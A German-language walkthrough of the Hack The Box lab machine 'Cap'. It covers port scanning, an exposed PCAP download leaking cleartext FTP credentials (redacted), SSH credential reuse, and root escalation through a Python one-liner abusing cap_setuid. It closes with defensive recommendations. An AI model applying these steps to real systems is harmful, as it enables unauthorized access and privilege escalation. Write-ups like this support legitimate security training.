# Hack The Box: Cap Writeup

Flags sind absichtlich nicht enthalten.

## Überblick

Cap ist eine einfache Linux-Maschine mit einem Security-Dashboard, das PCAP-Snapshots bereitstellt. Der Foothold entsteht durch Klartext-Credentials in einem herunterladbaren Capture. Die Privilege Escalation basiert auf einer gefährlichen Linux-Capability auf Python.

## Recon

Nmap zeigte drei offene Ports:

```text
21/tcp  ftp   vsftpd 3.0.3
22/tcp  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  http  Gunicorn Security Dashboard
```

Die Weboberfläche bot unter anderem folgende Pfade:

```text
/capture
/data/<id>
/download/<id>
/ip
/netstat
```

`/capture` erzeugte einen neuen 5-Sekunden-Snapshot und leitete auf `/data/<id>` weiter. Die PCAP-Datei konnte über `/download/<id>` heruntergeladen werden.

## Foothold

Der interessante Fund war ein älterer Capture unter `/download/0`. In den Strings bzw. im TCP-Dump waren FTP-Kommandos im Klartext sichtbar:

```text
USER nathan
PASS [redacted]
230 Login successful.
```

Die Credentials konnten für SSH wiederverwendet werden:

```text
ssh nathan@<target-ip>
```

Damit war Zugriff als User `nathan` möglich.

## Enumeration

Nach dem Login waren keine verwertbaren sudo-Rechte sichtbar. Die Suche nach Linux-Capabilities lieferte aber den entscheidenden Hinweis:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` auf einem Interpreter ist kritisch, weil der Prozess seine UID auf 0 setzen kann.

## Privilege Escalation

Mit Python konnte ein Root-Kontext hergestellt werden:

```text
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("id")'
```

Der gleiche Primitive genügte, um Root-only Dateien zu lesen.

## Kill Chain

```text
HTTP Dashboard
  -> PCAP download IDOR/Exposure
  -> FTP credentials in cleartext
  -> SSH as nathan
  -> Python cap_setuid
  -> root
```

## Takeaways

- PCAP-Downloadfunktionen können historische Credentials enthalten, besonders bei Klartextprotokollen wie FTP.
- Credentials sollten nicht zwischen FTP und SSH wiederverwendet werden.
- Interpreter mit `cap_setuid+eip` sind praktisch direkte Root-Privesc.

## Empfehlungen

- Keine Klartextprotokolle für Authentifizierung verwenden; FTP durch SFTP/FTPS ersetzen.
- PCAP-Downloads authentifizieren/autorisieren und sensible historische Captures nicht öffentlich bereitstellen.
- Linux-Capabilities regelmäßig auditieren und `cap_setuid` nur absolut notwendigen, minimalen Binaries geben.
